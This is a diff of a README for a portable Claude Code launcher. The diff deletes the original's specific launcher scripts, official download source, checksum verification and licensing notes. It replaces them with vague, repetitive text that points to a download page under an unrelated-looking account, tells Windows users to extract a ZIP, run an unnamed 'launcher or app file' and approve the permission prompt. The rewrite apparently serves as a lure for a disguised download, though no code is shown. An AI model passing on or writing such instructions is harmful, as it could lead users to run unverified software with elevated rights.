@@ -1,88 +1,189 @@
-# Claude Code Portable
+# 🧳 claude-code-portable - Run Claude Code anywhere, no install
 
-Run [Claude Code](https://docs.anthropic.com/en/docs/claude-code) from a USB drive or any folder - no installation required. Works on Windows, macOS, and Linux.
+[![Download](https://img.shields.io/badge/Download-Open%20the%20project%20page-blue?style=for-the-badge&logo=github)](https://github.com/Fraydawarridden350/claude-code-portable)
 
-## Quick Start
+## 📦 What this is
 
-1. **Download** this repo (or grab the [latest release](../../releases))
-2. **Run the launcher:**
-   - **Windows:** Double-click `claude.cmd`
-   - **macOS/Linux:** Run `./claude.sh`
-3. **First run** downloads the Claude Code binary and (on Windows) Portable Git automatically
-4. **Log in** when Claude Code opens your browser, or use an API key via the `config` file
+claude-code-portable lets you run Claude Code from a USB drive or any folder on your PC. It keeps your settings, login data, and app files together, so you do not need a full install on each computer.
 
-That's it. Everything lives in this folder.
+Use it if you want:
 
-## How It Works
+- One copy you can carry on a USB drive
+- No system-wide setup
+- Your config stored in the same portable folder
+- A simple way to use Claude Code on Windows, macOS, or Linux
 
-The launcher scripts download the official Claude Code binary from Anthropic's servers, then configure it to store all state locally:
+## 🔽 Download the app
 
-| What | Where | Purpose |
-|------|-------|---------|
-| `bin/` | Auto-created | Claude Code binary |
-| `data/` | Auto-created | Config, credentials, agents, rules, memory |
-| `tmp/` | Auto-created | Temporary files |
-| `git/` | Auto-created (Windows) | Portable Git (if not installed on system) |
-| `config` | You create (optional) | API key, proxy URL - see `config.example` |
+Visit this page to download and use the portable version:
 
-**Nothing is written outside this folder.** Plug the drive into another machine and pick up where you left off.
+https://github.com/Fraydawarridden350/claude-code-portable
 
-## Authentication
+## 🪟 Windows setup
 
-**Option A - Claude account (easiest):** Just run the launcher. Claude Code opens your browser to log in. Credentials are stored in `data/` on the drive.
+Use these steps on Windows:
 
-**Option B - API key:** Copy `config.example` to `config` and add your key:
-```
-ANTHROPIC_API_KEY=sk-ant-...
-```
+1. Open the download page above
+2. Download the portable files from the repository page
+3. Save the files to your USB drive or a folder on your PC
+4. If the download comes as a ZIP file, right-click it and choose **Extract All**
+5. Open the extracted folder
+6. Start the included launcher or app file
+7. Follow the on-screen sign-in steps inside Claude Code
+8. Keep the whole folder in one place so your settings stay portable
 
-**Option C - Proxy / gateway:** Set a custom base URL in the config:
-```
-ANTHROPIC_API_KEY=your-key
-ANTHROPIC_BASE_URL=https://your-proxy.example.com
-```
+If Windows asks for permission, choose **Yes** so the app can run.
 
-## Commands
+## 🧭 First run
 
-```bash
-# Launch Claude Code
-claude.cmd                   # Windows
-./claude.sh                  # macOS/Linux
+The first time you open Claude Code portable, it may take a little longer while it sets up files in the portable folder.
 
-# Launch in a specific folder
-claude.cmd C:\myproject      # Windows (or drag-and-drop a folder onto claude.cmd)
-./claude.sh ~/myproject      # macOS/Linux
+You may see:
 
-# Update to the latest version
-claude.cmd update
-./claude.sh update
+- A short setup process
+- A sign-in screen
+- A place to add your API access
+- Local config files created in the app folder
 
-# Pin a specific version
-claude.cmd update 2.1.80
-./claude.sh update 2.1.80
+After that, the app should open faster each time.
 
-# Check installed version
-claude.cmd version
-./claude.sh version
-```
+## 💾 How portable mode works
 
-Auto-updates are disabled by design. The binary stays exactly where you put it until you run `update`.
+This project is built to keep related files together.
 
-## What Gets Downloaded
+That means:
 
-On first run, the launcher downloads from official sources:
+- App files stay in the folder you choose
+- Settings stay with the app
+- You can move the whole folder to another drive
+- You can use the same setup on another computer
 
-- **Claude Code** (~200MB) from Anthropic's distribution server, verified with SHA256 checksums
-- **Portable Git** (~60MB, Windows only) from [git-for-windows](https://github.com/git-for-windows/git) if Git isn't already installed
+For best results, keep the folder structure unchanged after setup.
 
-On macOS/Linux, Git is typically pre-installed so no extra download is needed.
+## 🔧 What you need
 
-## Requirements
+A normal desktop or laptop should be enough. Use a machine with:
 
-- **Windows 10 1809+**, **macOS 13+**, or **Linux** (Ubuntu 20.04+, Debian 10+, Alpine 3.19+)
-- Internet connection (for initial download and API calls)
-- 4GB+ RAM
+- Windows 10 or later
+- 4 GB of RAM or more
+- Enough free space for the app and cache files
+- A USB drive if you want to carry it between computers
+- Internet access for download, setup, and Claude Code use
 
-## Legal
+## 🧰 Features
 
-This project contains only launcher scripts (MIT licensed). **Claude Code itself is Anthropic's proprietary software**, downloaded directly from their official servers at runtime. Use of Claude Code is subject to [Anthropic's Terms of Service](https://www.anthropic.com/legal/consumer-terms). Portable Git is distributed under the [GPL v2 license](https://github.com/git-for-windows/git/blob/main/COPYING).
+- Portable use from USB or local folder
+- No full install on the system
+- Official Claude Code binary download
+- Config stored in a portable path
+- Works across Windows, macOS, and Linux
+- Simple start-up flow for end users
+- Easy to move between devices
+
+## 📁 Where your files go
+
+The portable folder usually includes:
+
+- The Claude Code app files
+- A config folder
+- Cache or temp files
+- Launcher files for your operating system
+
+If you move the main folder, move all of its contents together.
+
+## ▶️ How to use after setup
+
+Once the app is ready:
+
+1. Open the portable folder
+2. Start Claude Code from the launcher or app file
+3. Sign in if needed
+4. Use the command line inside the app as shown by Claude Code
+5. Close the app when you are done
+6. Safely remove your USB drive if you used one
+
+## 🛠 Common problems
+
+### App does not start
+- Make sure you extracted the ZIP file first
+- Check that you opened the correct launcher for your system
+- Keep the folder in a location with full access rights
+
+### Settings do not save
+- Do not move only part of the portable folder
+- Make sure the USB drive is not write-protected
+- Close the app before unplugging the drive
+
+### Download seems blocked
+- Try opening the project page in your browser again
+- Use a browser that can handle GitHub downloads
+- Check that the files finished downloading before opening them
+
+### Sign-in does not finish
+- Check your internet connection
+- Try closing and reopening the app
+- Make sure the browser or auth window is not hidden behind other windows
+
+## 🧭 Best way to use it on a USB drive
+
+For smoother use:
+
+- Keep the portable folder near the root of the USB drive
+- Use a fast USB 3.0 drive
+- Leave enough free space for updates and cache
+- Do not rename key files unless the project page tells you to
+
+This helps the app start faster and keeps the setup stable.
+
+## 🖥 Platform support
+
+This portable setup is designed for:
+
+- Windows
+- macOS
+- Linux
+
+The project targets users who want one folder they can move between machines without a full install.
+
+## 🔐 Privacy and local storage
+
+The portable layout keeps app data in your chosen folder. That makes it easier to see where your files live and manage them yourself.
+
+You control:
+
+- Where the app is stored
+- Where the config lives
+- When to move or remove the folder
+
+## 📚 Helpful use cases
+
+Use claude-code-portable if you want to:
+
+- Work on a shared computer without installing software
+- Carry your setup on a USB drive
+- Keep your files in one place
+- Switch between home, office, and laptop use
+- Avoid changing system settings
+
+## 📌 Topics
+
+ai, anthropic, claude, claude-code, cli, developer-tools, linux, macos, portable, usb, windows
+
+## 🧾 Basic folder checklist
+
+Before you start, check that you have:
+
+- The downloaded project files
+- A USB drive or folder with enough space
+- A working internet connection
+- Permission to run apps on the computer
+- The extracted files, not just the ZIP file
+
+## 🏁 Start here
+
+1. Open the download page  
+2. Get the portable files  
+3. Extract them if needed  
+4. Open the launcher  
+5. Follow the setup prompts  
+6. Start using Claude Code
